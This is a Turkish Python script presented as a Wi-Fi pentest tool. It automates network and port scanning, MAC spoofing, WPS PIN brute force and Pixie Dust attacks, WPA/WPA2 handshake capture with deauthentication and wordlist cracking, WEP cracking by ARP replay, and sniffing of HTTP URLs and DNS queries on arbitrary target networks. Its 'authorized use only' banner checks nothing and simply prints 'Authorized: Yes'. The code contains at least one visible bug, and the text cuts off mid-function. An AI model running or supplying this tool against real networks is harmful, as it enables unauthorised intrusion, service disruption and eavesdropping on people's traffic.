#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════╗
║                    WIFIX.py v2.0                        ║
║         Kapsamlı Wi-Fi Güvenlik Denetim Aracı            ║
║     Yalnızca Yetkili Pentest ve Eğitim Amaçlıdır        ║
╚══════════════════════════════════════════════════════════╝

Bağımlılıklar:
    sudo apt install -y aircrack-ng reaver bully macchanger
    pip3 install scapy requests colorama netifaces
"""

import os
import sys
import time
import re
import signal
import threading
import subprocess
import socket
import ipaddress
import json
import datetime
from typing import List, Dict, Optional, Tuple
from collections import defaultdict
from queue import Queue

# ============================================================
# GÜVENLİK KONTROLÜ - Yetkilendirme Bildirimi
# ============================================================
print("\n" + "=" * 60)
print("  WIFIX.py - Wi-Fi Güvenlik Denetim Aracı")
print("  YALNIZCA YETKİLİ PENTEST İÇİN KULLANIN")
print("  Yetkilendirildi: Evet")
print("=" * 60 + "\n")

# ============================================================
# RENK TANIMLARI
# ============================================================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def c(color, text):
    """Renklendirme yardımcısı"""
    return color + text + Colors.ENDC

def banner():
    print(c(Colors.HEADER, """
    ╔═══════════════════════════════════════╗
    ║     ██╗    ██╗██╗███████╗██╗██╗  ██╗║
    ║     ██║    ██║██║██╔════╝██║╚██╗██╔╝║
    ║     ██║ █╗ ██║██║█████╗  ██║ ╚███╔╝ ║
    ║     ██║███╗██║██║██╔══╝  ██║ ██╔██╗ ║
    ║     ╚███╔███╔╝██║██║     ██║██╔╝ ██╗║
    ║      ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝║
    ║     Wi-Fi Pentest Aracı v2.0         ║
    ╚═══════════════════════════════════════╝
    """))

# ============================================================
# YARDIMCI FONKSİYONLAR
# ============================================================

def check_root():
    """Root yetkisi kontrolü"""
    if os.geteuid() != 0:
        print(c(Colors.FAIL, "[!] Bu araç root yetkisi gerektirir!"))
        print(c(Colors.WARNING, "[*] sudo python3 wifix.py ile çalıştırın"))
        sys.exit(1)

def check_dependencies():
    """Gerekli araçların kurulu olup olmadığını kontrol et"""
    required_tools = {
        'airmon-ng': 'aircrack-ng',
        'airodump-ng': 'aircrack-ng',
        'aireplay-ng': 'aircrack-ng',
        'aircrack-ng': 'aircrack-ng',
        'reaver': 'reaver',
        'macchanger': 'macchanger'
    }
    missing = []
    for tool in required_tools:
        result = subprocess.run(['which', tool], capture_output=True, text=True)
        if result.returncode != 0:
            missing.append(required_tools[tool])
    
    if missing:
        print(c(Colors.WARNING, "[*] Eksik bağımlılıklar tespit edildi:"))
        for pkg in set(missing):
            print(c(Colors.WARNING, f"    sudo apt install -y {pkg}"))
        
        choice = input(c(Colors.OKCYAN, "\n[?] Devam etmek istiyor musunuz? (e/h): "))
        if choice.lower() != 'e':
            sys.exit(1)

def run_command(cmd: str, timeout: int = 30, shell: bool = True) -> Tuple[int, str, str]:
    """Komut çalıştır ve çıktıyı al"""
    try:
        result = subprocess.run(
            cmd, shell=shell, capture_output=True, text=True,
            timeout=timeout
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "TIMEOUT"
    except Exception as e:
        return -1, "", str(e)

def get_wireless_interfaces() -> List[str]:
    """Kablosuz arayüzleri listele"""
    result = run_command("iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*'")
    interfaces = [i for i in result[1].split('\n') if i]
    return interfaces

def enable_monitor_mode(interface: str) -> Optional[str]:
    """Monitor modunu etkinleştir"""
    print(c(Colors.OKCYAN, f"[*] {interface} için monitor modu etkinleştiriliyor..."))
    
    # Önce varsa mon interface'i temizle
    run_command(f"airmon-ng stop {interface}mon 2>/dev/null")
    run_command(f"airmon-ng check kill 2>/dev/null")
    
    # Monitor modu başlat
    ret, out, err = run_command(f"airmon-ng start {interface}")
    
    if 'monitor mode enabled' in out.lower() or 'monitor mode' in err.lower():
        mon_iface = f"{interface}mon"
        print(c(Colors.OKGREEN, f"[+] Monitor modu etkin: {mon_iface}"))
        return mon_iface
    
    # Alternatif kontrol
    mon_iface = f"{interface}mon"
    if os.path.exists(f"/sys/class/net/{mon_iface}"):
        print(c(Colors.OKGREEN, f"[+] Monitor modu etkin: {mon_iface}"))
        return mon_iface
    
    # Manuel dene
    run_command(f"ip link set {interface} down")
    run_command(f"iw dev {interface} set type monitor")
    run_command(f"ip link set {interface} up")
    
    ret, out, _ = run_command(f"iwconfig {interface} | grep -i mode")
    if 'monitor' in out.lower():
        print(c(Colors.OKGREEN, f"[+] Monitor modu etkin: {interface}"))
        return interface
    
    print(c(Colors.FAIL, "[!] Monitor modu etkinleştirilemedi!"))
    return None

def disable_monitor_mode(interface: str):
    """Monitor modunu kapat ve ağı geri yükle"""
    print(c(Colors.WARNING, "[*] Monitor modu kapatılıyor..."))
    run_command(f"airmon-ng stop {interface} 2>/dev/null")
    run_command("systemctl restart NetworkManager 2>/dev/null")
    print(c(Colors.OKGREEN, "[+] NetworkManager yeniden başlatıldı"))

def randomize_mac(interface: str) -> bool:
    """MAC adresini rastgele değiştir"""
    print(c(Colors.OKCYAN, f"[*] {interface} MAC adresi rastgeleleştiriliyor..."))
    run_command(f"ip link set {interface} down")
    ret, out, err = run_command(f"macchanger -r {interface}")
    run_command(f"ip link set {interface} up")
    
    if ret == 0:
        new_mac = ""
        for line in out.split('\n'):
            if 'New MAC' in line or 'Current MAC' in line:
                new_mac = line.split()[-1]
        print(c(Colors.OKGREEN, f"[+] Yeni MAC: {new_mac}"))
        return True
    return False

# ============================================================
# MODÜL 1: IP TARAMA
# ============================================================

def scan_ip(ip: str, timeout: float = 0.5) -> bool:
    """Bir IP'ye ping atarak aktif olup olmadığını kontrol et"""
    try:
        result = subprocess.run(
            ['ping', '-c', '1', '-W', str(int(timeout)), ip],
            capture_output=True, timeout=timeout + 1
        )
        return result.returncode == 0
    except:
        return False

def arp_scan(network: str) -> List[Dict]:
    """ARP kullanarak ağ taraması yap"""
    print(c(Colors.OKCYAN, f"\n[*] ARP taraması başlatılıyor: {network}"))
    results = []
    
    ret, out, err = run_command(f"arp-scan --localnet 2>/dev/null || nmap -sn {network} 2>/dev/null")
    
    if ret == 0:
        for line in out.split('\n'):
            if '\t' in line:
                parts = line.split('\t')
                if len(parts) >= 2:
                    ip = parts[0].strip()
                    mac = parts[1].strip()
                    results.append({'ip': ip, 'mac': mac, 'hostname': ''})
    
    return results

def ip_scan_menu(network: str = None):
    """IP tarama menüsü"""
    print(c(Colors.HEADER, "\n" + "=" * 50))
    print(c(Colors.BOLD, "  [1] IP TARAMA MODÜLÜ"))
    print(c(Colors.HEADER, "=" * 50))
    
    if not network:
        # Varsayılan ağı bul
        ret, out, _ = run_command("ip route | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+/\\d+' | head -1")
        network = out.strip() if out.strip() else "192.168.1.0/24"
    
    print(c(Colors.OKBLUE, f"[*] Taranacak ağ: {network}"))
    
    # Hızlı ARP taraması
    print(c(Colors.OKCYAN, "\n[*] ARP taraması yapılıyor..."))
    devices = arp_scan(network)
    
    # Ping taraması
    print(c(Colors.OKCYAN, "[*] Ping taraması yapılıyor..."))
    net = ipaddress.ip_network(network, strict=False)
    active_ips = []
    
    def ping_host(ip_str):
        if scan_ip(ip_str):
            active_ips.append(ip_str)
    
    threads = []
    for host in net.hosts():
        t = threading.Thread(target=ping_host, args=(str(host),))
        threads.append(t)
        t.start()
        if len(threads) >= 50:
            for t2 in threads:
                t2.join()
            threads = []
    
    for t in threads:
        t.join()
    
    print(c(Colors.OKGREEN, f"\n[+] Aktif cihazlar ({len(active_ips)}):"))
    print("-" * 50)
    print(f"{'IP Adresi':<18} {'Durum':<10}")
    print("-" * 50)
    
    for ip in sorted(active_ips, key=lambda x: int(x.split('.')[-1])):
        print(f"{ip:<18} {c(Colors.OKGREEN, 'Aktif'):<10}")
    
    # ARP sonuçlarını da göster
    if devices:
        print(c(Colors.OKCYAN, f"\n[*] ARP ile bulunan cihazlar ({len(devices)}):"))
        print("-" * 60)
        print(f"{'IP':<16} {'MAC':<20} {'Hostname':<20}")
        print("-" * 60)
        for d in devices:
            print(f"{d['ip']:<16} {d['mac']:<20} {d['hostname']:<20}")
    
    return active_ips

# ============================================================
# MODÜL 2: PORT TARAMA
# ============================================================

COMMON_PORTS = {
    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
    53: 'DNS', 80: 'HTTP', 110: 'POP3', 111: 'RPC',
    135: 'MSRPC', 139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS',
    445: 'SMB', 514: 'Syslog', 993: 'IMAPS', 995: 'POP3S',
    1433: 'MSSQL', 1521: 'Oracle', 2049: 'NFS', 3306: 'MySQL',
    3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
    8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 27017: 'MongoDB'
}

def scan_port(ip: str, port: int, timeout: float = 1.0) -> Tuple[int, bool, str]:
    """TCP port taraması"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        
        if result == 0:
            service = COMMON_PORTS.get(port, 'Unknown')
            # Banner grab dene
            try:
                banner_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                banner_sock.settimeout(2)
                banner_sock.connect((ip, port))
                banner_sock.send(b'\r\n')
                banner_data = banner_sock.recv(1024).decode('utf-8', errors='ignore')
                banner_sock.close()
                return (port, True, f"{service}|{banner_data.strip()[:50]}")
            except:
                return (port, True, service)
        return (port, False, '')
    except:
        return (port, False, '')

def port_scan_menu():
    """Port tarama menüsü"""
    print(c(Colors.HEADER, "\n" + "=" * 50))
    print(c(Colors.BOLD, "  [2] PORT TARAMA MODÜLÜ"))
    print(c(Colors.HEADER, "=" * 50))
    
    target = input(c(Colors.OKCYAN, "[?] Hedef IP adresi: "))
    
    print(c(Colors.OKBLUE, "[*] Port seçenekleri:"))
    print("  1 - Yaygın portlar (1-1024)")
    print("  2 - Tüm portlar (1-65535) [yavaş]")
    print("  3 - Sık kullanılan portlar (top 100)")
    choice = input(c(Colors.OKCYAN, "[?] Seçiminiz (1-3): "))
    
    ports = []
    if choice == '1':
        ports = list(range(1, 1025))
    elif choice == '2':
        ports = list(range(1, 65536))
    elif choice == '3':
        ports = list(COMMON_PORTS.keys())
    else:
        ports = list(COMMON_PORTS.keys())
    
    print(c(Colors.OKCYAN, f"\n[*] {len(ports)} port taranıyor... Hedef: {target}"))
    print(c(Colors.WARNING, "[*] Bu işlem birkaç dakika sürebilir...\n"))
    
    open_ports = []
    progress_lock = threading.Lock()
    scanned = [0]
    start_time = time.time()
    
    def worker(port_list):
        for port in port_list:
            _, is_open, service = scan_port(target, port, timeout=0.5)
            if is_open:
                with progress_lock:
                    open_ports.append((port, service))
            
            with progress_lock:
                scanned[0] += 1
                if scanned[0] % 50 == 0 or scanned[0] == len(ports):
                    elapsed = time.time() - start_time
                    pct = (scanned[0] / len(ports)) * 100
                    print(f"\r[*] İlerleme: %{pct:.1f} | {scanned[0]}/{len(ports)} | Açık: {len(open_ports)} | Süre: {elapsed:.1f}s", end='', flush=True)
    
    # Thread pool
    num_threads = 20
    chunk_size = max(1, len(ports) // num_threads)
    threads = []
    
    for i in range(0, len(ports), chunk_size):
        chunk = ports[i:i + chunk_size]
        t = threading.Thread(target=worker, args=(chunk,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    elapsed = time.time() - start_time
    print(f"\n\n{c(Colors.OKGREEN, f'[+] Tarama tamamlandı! Süre: {elapsed:.1f}s')}")
    
    if open_ports:
        open_ports.sort(key=lambda x: x[0])
        print(c(Colors.OKGREEN, f"\n[+] Açık portlar ({len(open_ports)}):"))
        print("-" * 60)
        print(f"{'PORT':<10} {'SERVİS':<20} {'BANNER / DETAY':<30}")
        print("-" * 60)
        for port, service in open_ports:
            parts = service.split('|', 1)
            serv_name = parts[0]
            banner_info = parts[1] if len(parts) > 1 else ''
            print(f"{f'{port}/tcp':<10} {serv_name:<20} {banner_info:<30}")
    else:
        print(c(Colors.WARNING, "\n[!] Açık port bulunamadı."))
    
    return open_ports

# ============================================================
# MODÜL 3: Wi-Fi AĞ TARAMA
# ============================================================

def wifi_scan_menu(interface: str):
    """Wi-Fi ağlarını tara"""
    print(c(Colors.HEADER, "\n" + "=" * 50))
    print(c(Colors.BOLD, "  [3] Wi-Fi AĞ TARAMA MODÜLÜ"))
    print(c(Colors.HEADER, "=" * 50))
    
    if not interface:
        interfaces = get_wireless_interfaces()
        if not interfaces:
            print(c(Colors.FAIL, "[!] Kablosuz arayüz bulunamadı!"))
            return []
        
        print(c(Colors.OKBLUE, "\n[*] Mevcut arayüzler:"))
        for i, iface in enumerate(interfaces):
            print(f"  {i+1} - {iface}")
        
        choice = input(c(Colors.OKCYAN, "\n[?] Arayüz seçin (1): "))
        try:
            idx = int(choice) - 1 if choice else 0
            interface = interfaces[idx]
        except:
            interface = interfaces[0]
    
    # Monitor modu
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        return []
    
    # MAC rastgeleleştir
    randomize_mac(mon_iface)
    
    print(c(Colors.OKCYAN, f"\n[*] Wi-Fi ağları taranıyor ({mon_iface})..."))
    print(c(Colors.WARNING, "[*] 15 saniye bekleniyor...\n"))
    
    # airodump-ng ile tara
    output_file = f"/tmp/wifiscan_{int(time.time())}"
    cmd = f"airodump-ng {mon_iface} -w {output_file} --output-format csv --write-interval 1 --beacons 2>/dev/null &"
    pid = subprocess.Popen(cmd, shell=True)
    
    time.sleep(15)
    
    # Durdur
    run_command(f"pkill -f 'airodump-ng {mon_iface}'")
    time.sleep(1)
    
    networks = []
    
    # CSV'den oku
    csv_file = f"{output_file}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r', errors='ignore') as f:
            lines = f.readlines()
        
        in_aps = False
        for line in lines:
            if 'BSSID' in line and 'First time seen' in line:
                in_aps = True
                continue
            if in_aps and 'Station MAC' in line:
                break
            if in_aps and line.strip():
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 14:
                    bssid = parts[0]
                    if len(bssid) == 17 and ':' in bssid:
                        network = {
                            'bssid': bssid,
                            'channel': parts[3],
                            'speed': parts[4],
                            'privacy': parts[5],
                            'cipher': parts[6],
                            'auth': parts[7],
                            'power': parts[8],
                            'beacons': parts[9],
                            'iv': parts[10],
                            'essid': parts[13],
                            'clients': []
                        }
                        networks.append(network)
        
        os.remove(csv_file)
    
    # Temizlik
    for f in [f"{output_file}-01.csv", f"{output_file}-01.kismet.csv", f"{output_file}-01.kismet.netxml"]:
        if os.path.exists(f):
            os.remove(f)
    
    if networks:
        print(c(Colors.OKGREEN, f"\n[+] Bulunan ağlar ({len(networks)}):"))
        print("-" * 100)
        print(f"{'#':<3} {'ESSID':<25} {'BSSID':<18} {'CH':<4} {'Güç':<5} {'Kripto':<12} {'Auth':<10}")
        print("-" * 100)
        
        networks.sort(key=lambda x: int(x['power']) if x['power'].replace('-','').isdigit() else 0, reverse=True)
        
        for i, net in enumerate(networks):
            essid = net['essid'] if net['essid'] and net['essid'] != '\\x00' else '<Gizli>'
            power = net['power'] if net['power'] else 'N/A'
            privacy = net['privacy'].strip() if net['privacy'] else 'OPN'
            
            # Güce göre renk
            try:
                pwr = int(power.replace('-',''))
                if pwr >= 80:
                    power_str = c(Colors.OKGREEN, power)
                elif pwr >= 60:
                    power_str = c(Colors.WARNING, power)
                else:
                    power_str = c(Colors.FAIL, power)
            except:
                power_str = power
            
            print(f"{i+1:<3} {essid:<25} {net['bssid']:<18} {net['channel']:<4} {power_str:<5} {privacy:<12} {net['auth']:<10}")
    else:
        print(c(Colors.WARNING, "[!] Hiç ağ bulunamadı. Anteni kontrol edin."))
    
    return networks, mon_iface

# ============================================================
# MODÜL 4: WPS SALDIRI
# ============================================================

def wps_attack_menu(mon_iface: str):
    """WPS PIN saldırısı"""
    print(c(Colors.HEADER, "\n" + "=" * 50))
    print(c(Colors.BOLD, "  [4] WPS SALDIRI MODÜLÜ"))
    print(c(Colors.HEADER, "=" * 50))
    
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (00:11:22:33:44:55): "))
    essid = input(c(Colors.OKCYAN, "[?] Hedef ESSID (isteğe bağlı): "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal (isteğe bağlı): "))
    
    if not bssid or len(bssid) != 17:
        print(c(Colors.FAIL, "[!] Geçerli bir BSSID girin!"))
        return False
    
    # Kanalı ayarla
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    print(c(Colors.WARNING, "\n[*] Saldırı seçenekleri:"))
    print("  1 - Reaver WPS PIN brute force (standart)")
    print("  2 - Bully WPS PIN brute force")
    print("  3 - Pixie Dust saldırısı (WPS PIN hesaplama)")
    print("  4 - Wash WPS taraması (çevredeki WPS ağlarını bul)")
    
    choice = input(c(Colors.OKCYAN, "\n[?] Seçiminiz (1-4): "))
    
    if choice == '4':
        # Wash taraması
        print(c(Colors.OKCYAN, "[*] WPS ağları taranıyor (30 saniye)..."))
        run_command(f"wash -i {mon_iface} -C 2>/dev/null")
        return True
    
    if choice == '1':
        print(c(Colors.OKCYAN, f"\n[*] Reaver WPS saldırısı başlatılıyor: {bssid}"))
        print(c(Colors.WARNING, "[*] Bu işlem uzun sürebilir (dakikalar-saatler)..."))
        
        pin = input(c(Colors.OKCYAN, "[?] PIN kodu (boş bırakılırsa brute force): "))
        
        cmd = f"reaver -i {mon_iface} -b {bssid} -vv -L -N"
        if pin:
            cmd += f" -p {pin}"
        if essid:
            cmd += f" -e '{essid}'"
        
        print(c(Colors.WARNING, f"\n[*] Çalıştırılıyor: {cmd}"))
        print(c(Colors.WARNING, "[*] Çıkmak için Ctrl+C\n"))
        
        os.system(cmd)
    
    elif choice == '2':
        print(c(Colors.OKCYAN, f"\n[*] Bully WPS saldırısı başlatılıyor: {bssid}"))
        
        cmd = f"bully {mon_iface} -b {bssid} -v 3"
        if essid:
            cmd += f" -e '{essid}'"
        
        print(c(Colors.WARNING, f"\n[*] Çalıştırılıyor: {cmd}"))
        print(c(Colors.WARNING, "[*] Çıkmak için Ctrl+C\n"))
        
        os.system(cmd)
    
    elif choice == '3':
        print(c(Colors.OKCYAN, f"\n[*] Pixie Dust saldırısı başlatılıyor: {bssid}"))
        
        cmd = f"reaver -i {mon_iface} -b {bssid} -vv -K 1 -N -L"
        if essid:
            cmd += f" -e '{essid}'"
        
        print(c(Colors.WARNING, f"\n[*] Çalıştırılıyor: {cmd}"))
        print(c(Colors.WARNING, "[*] Pixie Dust genellikle saniyeler içinde sonuç verir\n"))
        
        os.system(cmd)
    
    return True

# ============================================================
# MODÜL 5: WPA/WPA2 SALDIRI
# ============================================================

def wpa_attack_menu(mon_iface: str):
    """WPA/WPA2 handshake yakalama ve kırma"""
    print(c(Colors.HEADER, "\n" + "=" * 50))
    print(c(Colors.BOLD, "  [5] WPA/WPA2 SALDIRI MODÜLÜ"))
    print(c(Colors.HEADER, "=" * 50))
    
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (00:11:22:33:44:55): "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    essid = input(c(Colors.OKCYAN, "[?] ESSID: "))
    
    if not bssid or len(bssid) != 17:
        print(c(Colors.FAIL, "[!] Geçerli bir BSSID girin!"))
        return False
    
    # Kanalı ayarla
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
        time.sleep(0.5)
    
    capture_file = f"/tmp/handshake_{int(time.time())}"
    
    print(c(Colors.OKCYAN, f"\n[*] Handshake yakalama başlatılıyor: {essid} ({bssid})"))
    print(c(Colors.WARNING, "[*] airodump-ng çalışıyor..."))
    print(c(Colors.WARNING, "[*] Aynı anda deauth gönderilecek...\n"))
    
    # airodump-ng başlat
    dump_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {capture_file} {mon_iface} 2>/dev/null &"
    subprocess.Popen(dump_cmd, shell=True)
    
    time.sleep(2)
    
    # Deauth attack (5 paket)
    print(c(Colors.WARNING, "[*] Deauth paketleri gönderiliyor (hedefe bağlı istemciler varsa)..."))
    deauth_cmd = f"aireplay-ng -0 5 -a {bssid} {mon_iface} 2>/dev/null &"
    subprocess.Popen(deauth_cmd, shell=True)
    
    print(c(Colors.OKCYAN, "[*] 30 saniye bekleniyor (handshake yakalamak için)..."))
    
    for i in range(30, 0, -1):
        print(f"\r[*] Bekleniyor: {i} saniye...", end='', flush=True)
        time.sleep(1)
    
    print()
    
    # airodump-ng durdur
    run_command("pkill -f 'airodump-ng'")
    time.sleep(1)
    
    # Handshake kontrolü
    cap_file = f"{capture_file}-01.cap"
    if os.path.exists(cap_file):
        ret, out, _ = run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep -i handshake")
        
        if '1 handshake' in out.lower() or 'handshake' in out.lower():
            print(c(Colors.OKGREEN, f"\n[+] Handshake yakalandı! Dosya: {cap_file}"))
            
            # Wordlist ile kırma
            print(c(Colors.OKCYAN, "\n[*] Şifre kırmak için:"))
            wordlist = input(c(Colors.OKCYAN, "[?] Wordlist yolu (boş=rockyou): "))
            
            if not wordlist:
                wordlist = "/usr/share/wordlists/rockyou.txt"
                if not os.path.exists(wordlist):
                    # Alternatif wordlistler
                    alt_wordlists = [
                        "/usr/share/wordlists/rockyou.txt.gz",
                        "/usr/share/wordlists/rockyou.txt",
                        "/usr/share/wordlists/fasttrack.txt",
                        "/usr/share/wordlists/fern-wifi/common.txt"
                    ]
                    for wl in alt_wordlists:
                        if os.path.exists(wl):
                            if wl.endswith('.gz'):
                                run_command(f"gunzip -k {wl} 2>/dev/null")
                                wordlist = wl.replace('.gz', '')
                            else:
                                wordlist = wl
                            break
            
            if os.path.exists(wordlist):
                print(c(Colors.OKCYAN, f"\n[*] aircrack-ng ile kırma başlatılıyor..."))
                print(c(Colors.WARNING, f"    Wordlist: {wordlist}"))
                print(c(Colors.WARNING, "    Bu işlem çok uzun sürebilir!\n"))
                
                crack_cmd = f"aircrack-ng -a 2 -b {bssid} -w {wordlist} {cap_file}"
                os.system(crack_cmd)
            else:
                print(c(Colors.WARNING, f"[!] Wordlist bulunamadı: {wordlist}"))
                print(c(Colors.OKBLUE, f"[*] Cap dosyası kaydedildi: {cap_file}"))
                print(c(Colors.OKBLUE, "[*] Daha sonra kırmak için:"))
                print(c(Colors.OKBLUE, f"    aircrack-ng -a 2 -b {bssid} -w /path/to/wordlist.txt {cap_file}"))
        else:
            print(c(Colors.WARNING, "\n[!] Handshake yakalanamadı."))
            print(c(Colors.OKBLUE, "[*] Cap dosyası yine de kaydedildi, elle kontrol edin."))
            print(c(Colors.OKBLUE, f"    ls -la {capture_file}*"))
    else:
        print(c(Colors.FAIL, "\n[!] Cap dosyası oluşturulamadı!"))
    
    return True

# ============================================================
# MODÜL 6: WEP SALDIRI
# ============================================================

def wep_attack_menu(mon_iface: str):
    """WEP kırma saldırısı"""
    print(c(Colors.HEADER, "\n" + "=" * 50))
    print(c(Colors.BOLD, "  [6] WEP SALDIRI MODÜLÜ"))
    print(c(Colors.HEADER, "=" * 50))
    
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (00:11:22:33:44:55): "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    essid = input(c(Colors.OKCYAN, "[?] ESSID: "))
    
    if not bssid or len(bssid) != 17:
        print(c(Colors.FAIL, "[!] Geçerli bir BSSID girin!"))
        return False
    
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    capture_file = f"/tmp/wep_crack_{int(time.time())}"
    
    print(c(Colors.OKCYAN, f"\n[*] WEP kırma başlatılıyor: {essid} ({bssid})"))
    print(c(Colors.WARNING, "[*] IV toplamak için airodump-ng başlatılıyor..."))
    
    # airodump ile IV topla
    dump_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {capture_file} {mon_iface} 2>/dev/null &"
    subprocess.Popen(dump_cmd, shell=True)
    
    print(c(Colors.OKCYAN, "[*] ARP replay ile IV üretimi başlatılıyor..."))
    
    # ARP replay
    replay_cmd = f"aireplay-ng -3 -b {bssid} {mon_iface} 2>/dev/null &"
    subprocess.Popen(replay_cmd, shell=True)
    
    print(c(Colors.WARNING, "\n[*] En az 20.000 IV toplanması gerekiyor."))
    print(c(Colors.WARNING, "[*] 60 saniye bekleniyor..."))
    
    for i in range(60, 0, -5):
        print(f"\r[*] Bekleniyor: {i} saniye...", end='', flush=True)
        time.sleep(5)
    
    print()
    
    # Durdur
    run_command("pkill -f 'airodump-ng'")
    run_command("pkill -f 'aireplay-ng'")
    time.sleep(1)
    
    cap_file = f"{capture_file}-01.cap"
    if os.path.exists(cap_file):
        print(c(Colors.OKCYAN, f"\n[*] aircrack-ng ile WEP kırılıyor..."))
        crack_cmd = f"aircrack-ng -a 1 -b {bssid} {cap_file}"
        os.system(crack_cmd)
    else:
        print(c(Colors.FAIL, "[!] Cap dosyası bulunamadı!"))
    
    return True

# ============================================================
# MODÜL 7: AĞ DİNLEME & ANALİZ
# ============================================================

def network_monitor_menu(interface: str):
    """Ağ trafiğini dinle ve analiz et"""
    print(c(Colors.HEADER, "\n" + "=" * 50))
    print(c(Colors.BOLD, "  [7] AĞ DİNLEME & ANALİZ MODÜLÜ"))
    print(c(Colors.HEADER, "=" * 50))
    
    if not interface:
        interfaces = get_wireless_interfaces()
        if not interfaces:
            print(c(Colors.FAIL, "[!] Arayüz bulunamadı!"))
            return
        
        print(c(Colors.OKBLUE, "\n[*] Mevcut arayüzler:"))
        for i, iface in enumerate(interfaces):
            print(f"  {i+1} - {iface}")
        
        choice = input(c(Colors.OKCYAN, "\n[?] Arayüz seçin (1): "))
        try:
            idx = int(choice) - 1 if choice else 0
            interface = interfaces[idx]
        except:
            interface = interfaces[0]
    
    print(c(Colors.OKCYAN, "\n[*] Dinleme seçenekleri:"))
    print("  1 - Hızlı paket analizi (30 saniye)")
    print("  2 - HTTP trafiği izleme (URL'ler)")
    print("  3 - DHCP isteklerini izle")
    print("  4 - DNS sorgularını izle")
    print("  5 - Tüm protokoller (sürekli dinleme)")
    
    choice = input(c(Colors.OKCYAN, "\n[?] Seçiminiz (1-5): "))
    
    try:
        from scapy.all import sniff, Ether, IP, TCP, UDP, DNS, DHCP, HTTP, Raw
    except ImportError:
        print(c(Colors.WARNING, "[!] Scapy kurulu değil. Yükleniyor..."))
        os.system("pip3 install scapy 2>/dev/null")
        from scapy.all import sniff, Ether, IP, TCP, UDP, DNS, DHCP, HTTP, Raw
    
    stats = {
        'total': 0,
        'tcp': 0, 'udp': 0, 'dns': 0, 'dhcp': 0,
        'http': 0, 'https': 0, 'arp': 0, 'other': 0,
        'unique_ips': set(),
        'urls': [],
        'dns_queries': [],
        'dhcp_discover': []
    }
    
    start_time = time.time()
    
    def analyze_packet(packet):
        stats['total'] += 1
        
        if packet.haslayer(Ether):
            # ARP
            if packet.haslayer('ARP'):
                stats['arp'] += 1
            
            # IP katmanı
            if packet.haslayer(IP):
                ip_layer = packet[IP]
                src_ip = ip_layer.src
                dst_ip = ip_layer.dst
                stats['unique_ips'].add(src_ip)
                stats['unique_ips'].add(dst_ip)
                
                # TCP
                if packet.haslayer(TCP):
                    stats['tcp'] += 1
                    tcp = packet[TCP]
                    
                    # HTTP
                    if tcp.dport == 80 or tcp.sport == 80:
                        stats['http'] += 1
                        if packet.haslayer(Raw):
                            try:
                                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                                for line in payload.split('\n'):
                                    if line.startswith('GET ') or line.startswith('POST ') or line.startswith('Host:'):
                                        stats['urls'].append(line.strip()[:100])
                            except:
                                pass
                    
                    # HTTPS
                    if tcp.dport == 443 or tcp.sport == 443:
                        stats['https'] += 1
                
                # UDP
                if packet.haslayer(UDP):
                    stats['udp'] += 1
                    udp = packet[UDP]
                    
                    # DNS
                    if packet.haslayer(DNS):
                        stats['dns'] += 1
                        dns = packet[DNS]
                        if dns.qr == 0:  # Query
                            try:
                                qname = dns.qd.qname.decode('utf-8', errors='ignore')
                                stats['dns_queries'].append(qname)
                            except:
                                pass
                    
                    # DHCP
                    if packet.haslayer(DHCP):
                        stats['dhcp'] += 1
                        try:
                            if packet[DHCP].options:
                                for opt in packet[DHCP].options:
                                    if isinstance(opt, tuple) and opt[0] == 'hostname':
                                        stats['dhcp_discover'].append(opt[1].decode('utf-8', errors='ignore'))
                        except:
                            pass
    
    duration = 0
    if choice == '1':
        duration = 30
    elif choice == '2':
        duration = 60
    elif choice == '3':
        duration = 30
    elif choice == '4':
        duration = 30
    elif choice == '5':
        duration = 0  # Sürekli
    
    if duration > 0:
        print(c(Colors.OKCYAN, f"\n[*] {duration} saniye boyunca dinleniyor..."))
        sniff(iface=interface, prn=analyze_packet, timeout=duration, store=0)
    else:
        print(c(Colors.OKCYAN, "\n[*] Sürekli dinleme başlatıldı (Ctrl+C ile durdurun)..."))
        try:
            sniff(iface=interface, prn=analyze_packet, store=0)
        except KeyboardInterrupt:
            pass
    
    elapsed = time.time() - start_time
    
    # Rapor
    print(c(Colors.HEADER, f"\n{'='*50}"))
    print(c(Colors.BOLD, f"  AĞ ANALİZ RAPORU ({elapsed:.1f} sn)"))
    print(c(Colors.HEADER, f"{'='*50}"))
    
    print(f"\n{c(Colors.OKBLUE)}[İSTATİSTİKLER]{c(Colors.ENDC)}")
    print(f"  Toplam paket: {stats['total']}")
